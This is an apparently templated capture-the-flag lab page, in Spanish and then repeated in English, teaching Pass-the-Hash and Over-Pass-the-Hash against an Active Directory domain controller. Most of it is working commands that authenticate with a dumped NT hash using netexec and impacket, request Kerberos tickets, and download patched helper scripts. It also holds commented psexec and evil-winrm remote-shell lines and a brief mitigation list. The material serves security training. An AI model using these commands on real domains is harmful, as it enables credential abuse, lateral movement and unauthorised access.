Objetivo

Con el hash NT de a.miller obtenido en el volcado del NTDS, autentícate en el dominio sin conocer su contraseña en claro y lee //DC01/finance.

Flag: //{{ ad_dc_host }}/finance/flag-ad-11.txt — captúrala en el Domain Controller y valídala en la caja «Validar Flag» al final de esta página.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Prerequisito: hash NT de a.miller obtenido en el lab AD10 (DCSync)
nxc smb {{ ad_dc_ip }} -u 'a.miller' -H '<hash_NT_a.miller>' --shares

1 · Por qué funciona

En NTLM, el cliente nunca envía la contraseña: prueba que conoce su hash NT mediante un reto/respuesta. Por tanto el hash NT es la credencial: si lo tienes, puedes autenticarte sin conocer la contraseña en claro. Esto es Pass-the-Hash.

2 · Obtener el hash

El hash de a.miller salió en el volcado NTDS del lab AD10:

a.miller:1108:aad3b435b51404eeaad3b435b51404ee:<hash_NT_a.miller>:::

# Nos quedamos solo con la parte NT (la que va detrás del segundo ':')
export ADMILLER_NT='<hash_NT_a.miller>'

3 · Autenticarse con el hash

# netexec — comprobar acceso y recursos
nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" --shares

# impacket-smbclient
impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}

# Un shell remoto si la cuenta fuese admin local en algún equipo
# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@<host>
# evil-winrm -i <host> -u a.miller -H "$ADMILLER_NT"

4 · Over-Pass-the-Hash (hash → ticket Kerberos)

El hash NT también sirve como clave RC4 para pedir un TGT y moverte por Kerberos (más sigiloso que NTLM):

impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
export KRB5CCNAME=a.miller.ccache
impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}

Nota sobre este laboratorio: el comando de arriba revienta con Attempted "__str__" operation on ASN.1 schema object — es un bug real de impacket (confirmado en la versión de Kali y en la última de PyPI), no algo específico de Samba: CCache.fromTGT() no comprueba si el campo opcional starttime del AS-REP tiene valor antes de convertirlo a texto, y Samba lo omite (RFC 4120 §5.4.2 permite omitirlo; Windows AD casi siempre lo incluye, por eso el bug pasa desapercibido en producción). Descarga el wrapper que lo corrige (monkeypatch de una función, sin tocar impacket):

smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'

python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
export KRB5CCNAME=a.miller.ccache
klist

El TGT ya es real y válido en este punto. El siguiente salto (pedir un TGS para cifs/{{ ad_dc_host|lower }} y usarlo contra SMB) topaba con un segundo bug de impacket, también real: getKerberosTGS() nunca manda el checksum keyed que RFC 4120 §5.5.1 exige en el Authenticator del TGS-REQ (key usage 6), y el KDC de Samba sí lo exige — sin él responde KRB_AP_ERR_INAPP_CKSUM (el mismo bug que bloqueaba Kerberoasting, ver AD05). Con ese checksum añadido, el acceso SMB vía Kerberos funciona completamente en vivo:

smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'

python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
# smb: \> use finance
# smb: \> get flag-ad-11.txt

Over-Pass-the-Hash completo y real: del hash NT de a.miller a una sesión SMB autenticada por Kerberos, sin conocer nunca su contraseña en claro.

Mitigación

  • Grupo Protected Users y desactivar NTLM donde sea posible (forzar Kerberos + AES).
  • LAPS + evitar reutilización de contraseñas de admin local para frenar el movimiento lateral.
  • Credential Guard y limitar los inicios de sesión interactivos de cuentas privilegiadas.

Herramientas

1 · Why it works

In NTLM the client never sends the password: it proves knowledge of its NT hash through a challenge/response. So the NT hash is the credential: if you have it, you can authenticate without knowing the cleartext. That is Pass-the-Hash.

2 · Get the hash

The a.miller hash came out of the NTDS dump in lab AD10:

a.miller:1108:aad3b435b51404eeaad3b435b51404ee:<a.miller_NT_hash>:::

# Keep just the NT part (after the second ':')
export ADMILLER_NT='<a.miller_NT_hash>'

3 · Authenticate with the hash

# netexec — check access and shares
nxc smb {{ ad_dc_ip }} -u 'a.miller' -H "$ADMILLER_NT" --shares

# impacket-smbclient
impacket-smbclient -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@{{ ad_dc_ip }}

# A remote shell if the account were a local admin somewhere
# impacket-psexec  -hashes ":$ADMILLER_NT" '{{ ad_realm_lower }}/a.miller'@<host>
# evil-winrm -i <host> -u a.miller -H "$ADMILLER_NT"

4 · Over-Pass-the-Hash (hash → Kerberos ticket)

The NT hash also works as an RC4 key to request a TGT and move over Kerberos (stealthier than NTLM):

impacket-getTGT '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
export KRB5CCNAME=a.miller.ccache
impacket-smbclient -k -no-pass {{ ad_dc_fqdn }}

Note about this lab: the command above blows up with Attempted "__str__" operation on ASN.1 schema object — this is a real impacket bug (confirmed in both Kali's packaged version and the latest PyPI release), not something Samba-specific: CCache.fromTGT() never checks whether the AS-REP's optional starttime field actually has a value before stringifying it, and Samba omits it (RFC 4120 §5.4.2 allows omitting it; Windows AD almost always includes it, which is why the bug goes unnoticed in production). Download the wrapper that fixes it (a one-function monkeypatch, impacket itself is untouched):

smbclient -N //{{ ad_dc_ip }}/public -c 'get getTGT_fixed.py'

python3 getTGT_fixed.py '{{ ad_realm_lower }}/a.miller' -hashes ":$ADMILLER_NT" -dc-ip {{ ad_dc_ip }}
export KRB5CCNAME=a.miller.ccache
klist

The TGT is real and valid at this point. The next hop (requesting a TGS for cifs/{{ ad_dc_host|lower }} and using it against SMB) hit a second, equally real impacket bug: getKerberosTGS() never sends the keyed checksum RFC 4120 §5.5.1 requires in the TGS-REQ Authenticator (key usage 6), and Samba's KDC genuinely requires it — without it, it replies KRB_AP_ERR_INAPP_CKSUM (the same bug that blocked Kerberoasting, see AD05). With that checksum added, Kerberos-based SMB access works fully live:

smbclient -N //{{ ad_dc_ip }}/public -c 'get smbclient_fixed.py'

python3 smbclient_fixed.py -k -no-pass {{ ad_dc_fqdn }} -dc-ip {{ ad_dc_ip }}
# smb: \> use finance
# smb: \> get flag-ad-11.txt

Full, real Over-Pass-the-Hash: from a.miller's NT hash to a Kerberos-authenticated SMB session, never knowing their cleartext password.
